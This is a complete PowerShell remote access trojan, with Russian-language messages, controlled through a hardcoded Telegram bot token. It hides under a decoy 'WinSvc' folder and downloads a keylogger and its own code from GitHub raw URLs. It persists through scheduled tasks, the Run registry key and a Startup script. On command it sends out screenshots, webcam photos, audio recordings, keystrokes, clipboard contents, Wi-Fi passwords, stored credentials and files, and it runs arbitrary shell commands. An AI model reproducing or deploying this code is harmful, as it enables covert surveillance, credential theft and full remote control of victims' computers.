$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
$mu=New-Object Threading.Mutex($false,'Local\WinSvcMtx')
if(!$mu.WaitOne(0)){exit}
$t='8910502460:AAHOY2nM6EhAH2scBAACKXJbmgVae_X-BjU'
$b="https://api.telegram.org/bot$t"
$src='https://raw.githubusercontent.com/Zaklol123/bot/main/svc.ps1'
$ksrc='https://raw.githubusercontent.com/Zaklol123/bot/main/kl.ps1'
$dir="$env:APPDATA\Microsoft\WinSvc"
New-Item -ItemType Directory -Force -Path $dir | Out-Null
attrib +h "$dir" 2>$null
$idf="$dir\owner.dat"; $of="$dir\off.dat"; $log="$dir\keys.txt"; $p="$dir\svc.ps1"; $k="$dir\kl.ps1"
if(!(Test-Path $p)){ try{ (New-Object Net.WebClient).DownloadFile($src,$p) }catch{} }
if(!(Test-Path $k)){ try{ (New-Object Net.WebClient).DownloadFile($ksrc,$k) }catch{} }
$first = -not (Test-Path "$dir\.i")
$MAX=3500; $o=0
if(Test-Path $of){$o=[int](Get-Content $of -Raw)}

function Chunk($s){
  $s="$s"
  while($s.Length -gt $MAX){
    $i=$s.LastIndexOf("`n",$MAX); if($i -lt 1){$i=$MAX}
    $s.Substring(0,$i); $s=$s.Substring($i)
  }
  $s
}
function Send($c,$s){
  if($null -eq $s -or "$s".Trim() -eq ''){$s='(пусто)'}
  foreach($ch in (Chunk $s)){ try{ Invoke-RestMethod "$b/sendMessage" -Method Post -Body @{chat_id=$c;text=$ch} | Out-Null }catch{} }
}
function F($c,$path,$kind){
  if(!(Test-Path $path)){Send $c "нет файла: $path"; return}
  $ep='send'+$kind.Substring(0,1).ToUpper()+$kind.Substring(1)
  try{ curl.exe -s -F "chat_id=$c" -F "$kind=@$path" "$b/$ep" | Out-Null }catch{ Send $c 'не отправилось' }
}
function Shot($c){
  Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing
  $r=[Windows.Forms.SystemInformation]::VirtualScreen
  $bmp=New-Object Drawing.Bitmap $r.Width,$r.Height
  $g=[Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($r.X,$r.Y,0,0,$bmp.Size)
  $f="$env:TEMP\$([guid]::NewGuid().ToString('N')).png"
  $bmp.Save($f,[Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bmp.Dispose()
  curl.exe -s -F "chat_id=$c" -F "photo=@$f" "$b/sendPhoto" | Out-Null
  Remove-Item $f -Force
}
function IsAdmin{ ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }
function Persist($on){
  $ps=(Get-Command powershell).Source
  $a="-w h -ep bypass -f `"$p`""
  if($on){
    schtasks /create /tn WinSvc /tr "`"$ps`" $a" /sc onlogon /f | Out-Null
    schtasks /create /tn WinSvcK /tr "`"$ps`" $a" /sc minute /mo 10 /f | Out-Null
    New-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name WinSvc -Value "powershell $a" -PropertyType String -Force | Out-Null
    $st=[Environment]::GetFolderPath('Startup')
    ('CreateObject("WScript.Shell").Run "powershell -w h -ep bypass -f ""' + $p + '""",0,False') | Set-Content "$st\WinSvc.vbs" -Encoding ASCII
  } else {
    schtasks /delete /tn WinSvc /f | Out-Null; schtasks /delete /tn WinSvcK /f | Out-Null
    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name WinSvc
    Remove-Item "$([Environment]::GetFolderPath('Startup'))\WinSvc.vbs" -Force
  }
}
function KlState{ if(Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object {$_.CommandLine -like '*kl.ps1*'}){'on'}else{'off'} }
function RunCmd($q,$to=25){
  $j=Start-Job -ScriptBlock {param($c) cmd /c $c 2>&1 | Out-String} -ArgumentList $q
  if(Wait-Job $j -Timeout $to){ $r=Receive-Job $j } else { Stop-Job $j; $r='[таймаут]' }
  Remove-Job $j -Force
  if(!$r){'(нет вывода)'}else{$r}
}
function Eval($code,$to=25){
  $j=Start-Job -ScriptBlock {param($c) [scriptblock]::Create($c).Invoke() | Out-String} -ArgumentList $code
  if(Wait-Job $j -Timeout $to){ $r=Receive-Job $j } else { Stop-Job $j; $r='[таймаут]' }
  Remove-Job $j -Force
  if(!$r){'(нет вывода)'}else{$r}
}
function Click($x,$y,$btn){
  $s='[DllImport("user32.dll")]public static extern bool SetCursorPos(int x,int y);[DllImport("user32.dll")]public static extern void mouse_event(uint f,uint dx,uint dy,uint d,IntPtr e);'
  $n=Add-Type -MemberDefinition $s -Name C -Namespace CC -PassThru
  if($btn -ne 'none'){ $n::SetCursorPos([int]$x,[int]$y) | Out-Null }
  if($btn -eq 'right'){ $n::mouse_event(8,0,0,0,[IntPtr]0); $n::mouse_event(16,0,0,0,[IntPtr]0) }
  elseif($btn -eq 'double'){ $n::mouse_event(2,0,0,0,[IntPtr]0); $n::mouse_event(4,0,0,0,[IntPtr]0); $n::mouse_event(2,0,0,0,[IntPtr]0); $n::mouse_event(4,0,0,0,[IntPtr]0) }
  elseif($btn -ne 'none'){ $n::mouse_event(2,0,0,0,[IntPtr]0); $n::mouse_event(4,0,0,0,[IntPtr]0) }
}

$HELP=@'
/info /admin /su /ip /env /whoami /priv
/shot /shots N /cam /rec N /monoff /monon /bright N
/ls /tree /cat /write /del /cp /mv /mkdir /rename /size /hidden /fileinfo /hash
/search NAME|PATH /findtext TEXT|PATH /zip SRC|OUT /unzip /dl URL|PATH /dlurl URL|DIR /up PATH /updir PATH
/ps /killp NAME /start PATH /sh CMD /ps1 CODE /base64 TEXT
/keys on|off|dump|clear
/clip /clipset /input TEXT /key KEY /click X|Y|btn /move X|Y
/msg TEXT /tts TEXT /beep /openurl URL /play PATH /titles /wall PATH|URL /loc
/wifi /wifipass /pass /users /drives /net /port HOST|PORT /ping HOST /trace HOST /arp /dns
/soft /tasks /services /startup /eventlog N /reg PATH /regset PATH|NAME|VAL /hist /uptime /battery /cpu /gpu /ram /disk /av
/vol /voldown /mute /lock /logoff /sleep /hibernate /reboot /shutdown
/persist on|off /install /selfupdate URL /restart /hide /uninstall /kill
'@

if($first){ Persist $true; New-Item -ItemType File -Force -Path "$dir\.i" | Out-Null }
if(Test-Path $idf){ Send (Get-Content $idf -Raw).Trim() "на связи: $env:COMPUTERNAME / $env:USERNAME" }

while($true){
  try{
    $res=Invoke-RestMethod "$b/getUpdates?offset=$o&timeout=25"
    foreach($u in $res.result){
      $o=$u.update_id+1; "$o" | Set-Content $of
      $m=$u.message; if(!$m){continue}
      $c=$m.chat.id
      $own=''; if(Test-Path $idf){$own=(Get-Content $idf -Raw).Trim()}
      if(!$own){ "$c" | Set-Content $idf; $own="$c"; Send $c "привязан. $env:COMPUTERNAME / $env:USERNAME" }
      if("$c" -ne $own){ continue }
      $q=$m.text
      if(!$q){ Send $c 'не текст'; continue }
      $a=''; if($q -match '^\S+\s+(.+)$'){$a=$Matches[1]}
      $cmd=($q -split '\s+')[0].ToLower()

      switch($cmd){
        '/help'{ Send $c $HELP; break }
        '/start'{ Send $c "на связи: $env:COMPUTERNAME"; break }
        '/info'{ $ip=(ipconfig | Select-String 'IPv4'); Send $c "host: $env:COMPUTERNAME`nuser: $env:USERNAME\$env:USERDOMAIN`nadmin: $(IsAdmin)`nos: $([Environment]::OSVersion.VersionString)`nuptime: $((Get-Date)-(gcim Win32_OperatingSystem).LastBootUpTime)`n$ip`nkeys: $(KlState)"; break }
        '/admin'{ Send $c "admin: $(IsAdmin)"; break }
        '/su'{ Start-Process (Get-Command powershell).Source -Verb RunAs -ArgumentList "-w h -ep bypass -f `"$p`""; Send $c 'запросил UAC'; break }
        '/ip'{ Send $c (ipconfig /all | Out-String); break }
        '/env'{ Send $c (Get-ChildItem env: | Format-Table Name,Value -Auto | Out-String); break }
        '/whoami'{ Send $c (whoami /all | Out-String); break }
        '/priv'{ Send $c (whoami /priv | Out-String); break }
        '/shot'{ Shot $c; break }
        '/shots'{ $n=[int]$a; if($n -lt 1){$n=3}; for($i=0;$i -lt $n;$i++){ Shot $c; Start-Sleep 2 }; break }
        '/cam'{ $f="$env:TEMP\c_$([guid]::NewGuid().ToString('N')).jpg"
          try{ $dm=New-Object -ComObject WIA.DeviceManager
            $dev=($dm.DeviceInfos | Where-Object {$_.Type -eq 1} | Select-Object -First 1).Connect()
            $img=(($dev.Items | Select-Object -First 1)).Transfer(); $img.SaveFile($f)
            curl.exe -s -F "chat_id=$c" -F "photo=@$f" "$b/sendPhoto" | Out-Null; Remove-Item $f -Force
          }catch{ Send $c "камера: $($_.Exception.Message)" }; break }
        '/rec'{ $n=[int]$a; if($n -lt 1){$n=5}; $f="$env:TEMP\r_$([guid]::NewGuid().ToString('N')).wav"
          $s='[DllImport("winmm.dll",CharSet=CharSet.Auto)]public static extern int mciSendString(string c,string r,int l,int h);'
          $w=Add-Type -MemberDefinition $s -Name W2 -Namespace M2 -PassThru
          $w::mciSendString("open new type waveaudio alias rec",$null,0,0); $w::mciSendString("record rec",$null,0,0)
          Start-Sleep $n; $w::mciSendString("save rec $f",$null,0,0); $w::mciSendString("close rec",$null,0,0)
          curl.exe -s -F "chat_id=$c" -F "audio=@$f" "$b/sendAudio" | Out-Null; break }
        '/monoff'{ $s='[DllImport("user32.dll")]public static extern IntPtr SendMessage(IntPtr h,uint m,IntPtr w,IntPtr l);'
          $n=Add-Type -MemberDefinition $s -Name M -Namespace MM -PassThru
          $n::SendMessage([IntPtr]0xffff,0x0112,[IntPtr]0xF170,[IntPtr]2) | Out-Null; break }
        '/monon'{ Click 1 1 'left'; break }
        '/bright'{ (Get-WmiObject -Namespace root/wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,[int]$a); Send $c "яркость $a"; break }
        '/ls'{ Send $c (RunCmd "dir `"$a`""); break }
        '/tree'{ Send $c (RunCmd "tree `"$a`" /a"); break }
        '/cat'{ Send $c (Get-Content $a -Raw); break }
        '/write'{ $x=$a -split '\|',2; Set-Content $x[0] $x[1]; Send $c "записал $($x[0])"; break }
        '/del'{ Remove-Item $a -Recurse -Force; Send $c "удалил $a"; break }
        '/cp'{ $x=$a -split '\|',2; Copy-Item $x[0] $x[1] -Recurse -Force; Send $c 'скопировал'; break }
        '/mv'{ $x=$a -split '\|',2; Move-Item $x[0] $x[1] -Force; Send $c 'перенёс'; break }
        '/mkdir'{ New-Item -ItemType Directory -Force -Path $a | Out-Null; Send $c "создал $a"; break }
        '/rename'{ $x=$a -split '\|',2; Rename-Item $x[0] $x[1] -Force; Send $c 'переименовал'; break }
        '/size'{ $s=(Get-ChildItem $a -Recurse -Force | Measure-Object Length -Sum); Send $c "$($s.Sum) байт, файлов: $($s.Count)"; break }
        '/hidden'{ $x=$a -split '\|',2; if($x[1] -eq 'off'){attrib -h -s $x[0]}else{attrib +h +s $x[0]}; Send $c 'ok'; break }
        '/fileinfo'{ Send $c (Get-Item $a | Format-List Name,FullName,Length,CreationTime,LastWriteTime,Attributes | Out-String); break }
        '/hash'{ Send $c ((Get-FileHash $a -Algorithm MD5).Hash); break }
        '/search'{ $x=$a -split '\|',2; if(!$x[1]){$x[1]=$env:USERPROFILE}
          Send $c (Get-ChildItem $x[1] -Recurse -Force -Filter $x[0] -ErrorAction SilentlyContinue | Select-Object -First 60 FullName | Out-String); break }
        '/findtext'{ $x=$a -split '\|',2; if(!$x[1]){$x[1]='.'}
          Send $c (Select-String -Path "$($x[1])\*" -Pattern $x[0] -SimpleMatch -List -ErrorAction SilentlyContinue | Select-Object -First 40 Path | Out-String); break }
        '/zip'{ $x=$a -split '\|',2; Compress-Archive -Path $x[0] -DestinationPath $x[1] -Force; Send $c "архив: $($x[1])"; break }
        '/unzip'{ $x=$a -split '\|',2; Expand-Archive -Path $x[0] -DestinationPath $x[1] -Force; Send $c 'распаковал'; break }
        '/dl'{ $x=$a -split '\s+',2; curl.exe -sL -o $x[1] $x[0]; Send $c "скачал в $($x[1])"; break }
        '/dlurl'{ $x=$a -split '\s+',2; $o1=Join-Path $x[1] ([IO.Path]::GetFileName(([uri]$x[0]).AbsolutePath)); curl.exe -sL -o $o1 $x[0]; Send $c "скачал в $o1"; break }
        '/up'{ F $c $a 'document'; break }
        '/updir'{ $z="$env:TEMP\$([guid]::NewGuid().ToString('N')).zip"; Compress-Archive -Path "$a\*" -DestinationPath $z -Force; F $c $z 'document'; Remove-Item $z -Force; break }
        '/ps'{ Send $c (Get-Process | Sort-Object CPU -Desc | Select-Object -First 45 Name,Id,CPU,WS | Format-Table -Auto | Out-String); break }
        '/killp'{ Stop-Process -Name $a -Force; Send $c "убил $a"; break }
        '/startp'{ Start-Process $a; Send $c "запустил $a"; break }
        '/sh'{ Send $c (RunCmd $a); break }
        '/ps1'{ Send $c (Eval $a); break }
        '/base64'{ Send $c ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a))); break }
        '/keys'{ switch($a){
            'on'{ if((KlState) -eq 'off'){ Start-Process (Get-Command powershell).Source -WindowStyle Hidden -ArgumentList "-w h -ep bypass -f `"$k`"" }; Send $c 'кейлоггер вкл' }
            'off'{ Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object {$_.CommandLine -like '*kl.ps1*'} | ForEach-Object {Stop-Process -Id $_.ProcessId -Force}; Send $c 'кейлоггер выкл' }
            'dump'{ F $c $log 'document' }
            'clear'{ Remove-Item $log -Force; Send $c 'лог очищен' }
            default{ Send $c "состояние: $(KlState)" } }; break }
        '/clip'{ Send $c (Get-Clipboard); break }
        '/clipset'{ Set-Clipboard $a; Send $c 'в буфере'; break }
        '/input'{ Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait($a); Send $c 'набрал'; break }
        '/key'{ Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait($a); break }
        '/click'{ $x=$a -split '\s+'; Click $x[0] $x[1] $x[2]; Send $c 'клик'; break }
        '/move'{ $x=$a -split '\s+'; Click $x[0] $x[1] 'none'; Send $c 'курсор'; break }
        '/msg'{ Start-Process powershell -WindowStyle Hidden -ArgumentList '-c',"Add-Type -AssemblyName System.Windows.Forms;[Windows.Forms.MessageBox]::Show(`"$a`")"; Send $c 'показал'; break }
        '/tts'{ (New-Object -ComObject SAPI.SpVoice).Speak($a); Send $c 'сказал'; break }
        '/beep'{ [Console]::Beep(1000,600); break }
        '/openurl'{ Start-Process $a; Send $c 'открыл'; break }
        '/play'{ (New-Object Media.SoundPlayer $a).Play(); Send $c 'играю'; break }
        '/titles'{ Send $c (Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object -Expand MainWindowTitle | Out-String); break }
        '/wall'{ if($a -match '^https?://'){ $f="$env:TEMP\w.jpg"; curl.exe -sL -o $f $a; $a=$f }
          Set-ItemProperty 'HKCU:\Control Panel\Desktop' Wallpaper $a; rundll32.exe user32.dll,UpdatePerUserSystemParameters; Send $c 'обои сменил'; break }
        '/loc'{ Send $c ((Invoke-RestMethod 'http://ip-api.com/json' -TimeoutSec 10) | Select-Object city,regionName,country,isp,query | Format-List | Out-String); break }
        '/wifi'{ Send $c (netsh wlan show profiles | Out-String); break }
        '/wifipass'{ $pr=(netsh wlan show profiles) | Select-String ':\s*(.+)$' | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
          $r=''; foreach($x in $pr){ $k2=(netsh wlan show profile name="$x" key=clear) | Select-String 'Key Content|Содержимое ключа'; $r+="$x => $($k2 -replace '.*:\s*','')`n" }; Send $c $r; break }
        '/pass'{ Send $c ((cmdkey /list | Out-String) + "`n" + (reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-String 'DefaultUserName|DefaultPassword' | Out-String)); break }
        '/users'{ Send $c (query user 2>&1 | Out-String); break }
        '/drives'{ Send $c (Get-PSDrive -PSProvider FileSystem | Format-Table Name,Used,Free -Auto | Out-String); break }
        '/net'{ Send $c (netstat -an | Select-String 'LISTENING' | Out-String); break }
        '/port'{ $x=$a -split '\s+'; Send $c (Test-NetConnection $x[0] -Port $x[1] -InformationLevel Quiet); break }
        '/ping'{ Send $c (ping -n 4 $a | Out-String); break }
        '/trace'{ Send $c (tracert -h 12 $a | Out-String); break }
        '/arp'{ Send $c (arp -a | Out-String); break }
        '/dns'{ Send $c (ipconfig /displaydns | Out-String); break }
        '/soft'{ $r=@(); foreach($kk in 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'){ $r+=Get-ItemProperty $kk | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion }
          Send $c ($r | Sort-Object DisplayName | Format-Table -Auto | Out-String); break }
        '/tasks'{ Send $c (schtasks /query /fo table | Out-String); break }
        '/services'{ Send $c (Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 80 Name,DisplayName | Format-Table -Auto | Out-String); break }
        '/startup'{ Send $c (Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location | Format-List | Out-String); break }
        '/eventlog'{ $n=[int]$a; if($n -lt 1){$n=30}; Send $c (Get-EventLog -LogName System -Newest $n | Select-Object TimeGenerated,EntryType,Source,Message | Format-List | Out-String); break }
        '/reg'{ Send $c (reg query $a | Out-String); break }
        '/regset'{ $x=$a -split '\|',3; Set-ItemProperty $x[0] -Name $x[1] -Value $x[2]; Send $c 'записал'; break }
        '/hist'{ Send $c (Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue | Out-String); break }
        '/uptime'{ Send $c ((Get-Date)-(gcim Win32_OperatingSystem).LastBootUpTime); break }
        '/battery'{ Send $c (Get-CimInstance Win32_Battery | Select-Object EstimatedChargeRemaining,BatteryStatus | Format-List | Out-String); break }
        '/cpu'{ Send $c (Get-CimInstance Win32_Processor | Select-Object Name,NumberOfCores,MaxClockSpeed,LoadPercentage | Format-List | Out-String); break }
        '/gpu'{ Send $c (Get-CimInstance Win32_VideoController | Select-Object Name,DriverVersion,AdapterRAM | Format-List | Out-String); break }
        '/ram'{ Send $c ("всего: " + [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1) + " ГБ"); break }
        '/disk'{ Send $c (Get-CimInstance Win32_DiskDrive | Select-Object Model,Size,SerialNumber | Format-List | Out-String); break }
        '/av'{ Send $c (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName,productState | Format-List | Out-String); break }
        '/vol'{ $w=New-Object -ComObject WScript.Shell; for($i=0;$i -lt 5;$i++){$w.SendKeys([char]175)}; Send $c 'громкость +'; break }
        '/voldown'{ $w=New-Object -ComObject WScript.Shell; for($i=0;$i -lt 5;$i++){$w.SendKeys([char]174)}; Send $c 'громкость -'; break }
        '/mute'{ (New-Object -ComObject WScript.Shell).SendKeys([char]173); Send $c 'mute'; break }
        '/lock'{ rundll32.exe user32.dll,LockWorkStation; Send $c 'залочил'; break }
        '/logoff'{ Send $c 'выхожу'; shutdown /l /f; break }
        '/sleep'{ Send $c 'в сон'; rundll32.exe powrprof.dll,SetSuspendState 0,1,0; break }
        '/hibernate'{ Send $c 'гибернация'; shutdown /h /f; break }
        '/reboot'{ Send $c 'перезагрузка'; shutdown /r /t 3; break }
        '/shutdown'{ Send $c 'выключение'; shutdown /s /t 3; break }
        '/persist'{ if($a -eq 'off'){Persist $false; Send $c 'автозапуск снят'}else{Persist $true; Send $c 'автозапуск стоит'}; break }
        '/install'{ Persist $true; Send $c 'переустановил'; break }
        '/selfupdate'{ curl.exe -sL -o "$p.new" $a; Move-Item "$p.new" $p -Force; Start-Process (Get-Command powershell).Source -WindowStyle Hidden -ArgumentList "-w h -ep bypass -f `"$p`""; Send $c 'обновился'; exit }
        '/restart'{ Start-Process (Get-Command powershell).Source -WindowStyle Hidden -ArgumentList "-w h -ep bypass -f `"$p`""; exit }
        '/hide'{ Start-Process (Get-Command powershell).Source -WindowStyle Hidden -ArgumentList "-w h -ep bypass -f `"$p`""; exit }
        '/uninstall'{ Persist $false; Send $c 'удаляюсь'; Start-Process cmd -WindowStyle Hidden -ArgumentList '/c',"timeout 3 & rmdir /s /q `"$dir`""; exit }
        '/kill'{ Send $c 'отключаюсь'; exit }
        default{ if($cmd.StartsWith('/')){ Send $c 'нет такой команды' } else { Send $c (RunCmd $q) } }
      }
    }
  }catch{ Start-Sleep 3 }
}
